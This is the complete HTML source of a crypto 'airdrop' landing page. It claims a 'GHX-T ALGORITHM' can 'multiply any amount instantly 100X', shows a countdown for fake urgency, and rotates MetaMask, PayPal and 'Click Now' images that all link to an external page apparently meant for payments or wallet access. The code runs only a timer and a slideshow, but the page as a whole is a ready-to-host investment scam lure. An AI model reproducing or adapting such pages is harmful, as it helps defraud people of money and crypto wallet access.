
<!DOCTYPE html>  
<html lang="en">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>100X AIRDROP</title>  
    <style>  
        /* Full Page Styling */  
        body {  
            margin: 0;  
            overflow: hidden;  
            background-color: black;  
            position: relative;  
            display: flex;  
            flex-direction: column;  
            align-items: center;  
            justify-content: flex-start;  
            height: 100vh;  
        }  

        /* Neon Border */  
        .border {  
            position: absolute;  
            top: 0;  
            left: 0;  
            width: 100vw;  
            height: 100vh;  
            border: 10px solid #00faff;  
            box-shadow: 0 0 40px #00faff;  
            border-radius: 25px;  
            pointer-events: none;  
        }  

        /* Countdown Timer */  
        .countdown-container {  
            margin-top: 10px;  
            color: darkblue;  
            font-size: 1rem;  
            font-weight: bold;  
            text-shadow: 0 0 10px white;  
            background: rgba(255, 255, 255, 0.9);  
            padding: 5px 15px;  
            border-radius: 8px;  
            box-shadow: 0 0 10px white;  
            border: 2px solid darkblue;  
            text-align: center;  
            z-index: 2;  
        }  

        /* Title GIF */  
        .title-gif {  
            margin-top: 15px;  
            max-width: 250px;  
            z-index: 2;  
        }  

        /* Scrolling GIFs Container */  
        .gif-container {  
            position: absolute;  
            top: 40%; /* Adjust this value to move the container down */  
            left: 50%;  
            transform: translate(-50%, -5%); /* Adjust the -50% if needed after moving */  
            width: 90%;  
            height: 200px;  
            display: flex;  
            align-items: center;  
            justify-content: center;  
            overflow: visible;  
            z-index: 1;  
        }  

        /* Individual GIFs */  
        .gif-container a {  
            display: none; /* Hide all links initially */  
            position: absolute;  
        }  

        .gif-container a.active {  
            display: block; /* Show only the active link */  
        }  

        .gif-container img {  
            max-width: 350px;  
            transition: opacity 1s ease-in-out;  
        }  
    </style>  
</head>  
<body>  

    <!-- Neon Border -->  
    <div class="border"></div>  

    <!-- Countdown Timer -->  
    <div class="countdown-container">  
        <strong>GHX-T ALGORITHM ™️©️ MULTIPLY ANY AMOUNT INSTANTLY 100X LIMITED TIME OFFER</strong><br>  
        <span id="timer"></span>  
    </div>  

    <!-- Title GIF -->  
    <img src="xx.gif" alt="100X Airdrop" class="title-gif">  

    <!-- Scrolling GIFs (Fixed Clickable Links) -->  
    <div class="gif-container">  
        <a href="https://fclmail.github.io/100xmetamaskpay/" class="active"><img src="metamask.gif" alt="MetaMask"></a>  
        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="paypal.gif" alt="PayPal"></a>  
        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="airdrop.gif" alt="Airdrop"></a>  
        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="multiply.gif" alt="Multiply"></a>  
        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="limitedtimeoffer.gif" alt="Limited Time Offer"></a>  
        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="allarewelcome.gif" alt="All Are Welcome"></a>  
        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="multiplier.gif" alt="Multiplier"></a>  
        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="supereasy.gif" alt="Super Easy"></a>  
        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="clicknow.gif" alt="Click Now"></a>  
    </div>  

    <script>  
        // Countdown Timer to March 31, 2025  
        function updateTimer() {  
            const targetDate = new Date("March 31, 2025 00:00:00").getTime();  
            setInterval(() => {  
                const now = new Date().getTime();  
                const timeLeft = targetDate - now;  
                if (timeLeft < 0) {  
                    document.getElementById("timer").innerHTML = "EXPIRED!";  
                    return;  
                }  
                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));  
                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));  
                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));  
                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);  
                document.getElementById("timer").innerHTML =  
                    `${days}d ${hours}h ${minutes}m ${seconds}s`;  
            }, 1000);  
        }  
        updateTimer();  

        // Scrolling GIFs Logic - Only One Active Link at a Time  
        let currentGif = 0;  
        const gifLinks = document.querySelectorAll(".gif-container a");  

        function showNextGif() {  
            gifLinks.forEach((link, index) => {  
                link.classList.remove("active");  
            });  
            gifLinks[currentGif].classList.add("active");  

            currentGif = (currentGif + 1) % gifLinks.length;  
        }  

        setInterval(showNextGif, 4000);  
    </script>  

</body>  
</html>
